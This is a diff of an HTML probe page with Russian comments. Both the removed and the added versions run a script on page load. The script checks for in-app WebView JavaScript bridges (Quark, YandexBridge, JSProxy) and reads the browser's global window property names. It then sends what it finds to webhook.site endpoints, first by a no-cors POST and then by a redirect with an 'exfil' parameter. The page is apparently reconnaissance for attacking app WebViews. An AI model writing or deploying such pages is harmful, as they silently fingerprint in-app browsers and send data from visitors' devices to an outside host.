@@ -1,26 +1,34 @@
 <!DOCTYPE html>
 <html>
-<head><title>Loading...</title></head>
+<head><title>Testing...</title></head>
 <body>
-   <script>
-    (function() {
-        var data = {
-            bridges: Object.getOwnPropertyNames(window),
-            userAgent: navigator.userAgent
-        };
+    <h1 id="status">Ждем исполнения скрипта...</h1>
 
-        fetch('https://webhook.site/da38e76f-4179-451b-9c4d-937c64f19e98', {
-            method: 'POST',
-            mode: 'no-cors', // Важно: пробуем отправить без проверки CORS
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
-        }).catch(err => {
-            // Если не вышло, пробуем старый добрый метод через форму
-            sendViaForm(data);
-        });
-    })();
-</script>
-<h1>Loading...</h1>
-    <h1>Пожалуйста, подождите...</h1>
+    <script>
+        // Функция для отправки данных через редирект (самый пробивной метод)
+        function sendData(param, value) {
+            window.location.href = "https://webhook.site/8b31d71f-32ab-418d-9e3f-e9dd72738799?" + param + "=" + encodeURIComponent(value);
+        }
+
+        try {
+            document.getElementById('status').innerText = "JS запущен, анализируем...";
+            
+            // 1. Проверяем наличие самого подозрительного объекта
+            var bridgeName = "None";
+            if (window.Quark) bridgeName = "Quark";
+            else if (window.YandexBridge) bridgeName = "YandexBridge";
+            else if (window.JSProxy) bridgeName = "JSProxy";
+
+            // 2. Вместо перебора всех ключей, берем только первые 10 для теста стабильности
+            var keys = Object.getOwnPropertyNames(window).slice(0, 15).join(',');
+
+            // 3. Пытаемся "вылететь" из WebView на вебхук с данными
+            sendData("exfil", "Bridge:" + bridgeName + "|Keys:" + keys);
+
+        } catch (e) {
+            // Если скрипт упал - отправляем ошибку
+            sendData("error", e.message);
+        }
+    </script>
 </body>
 </html>
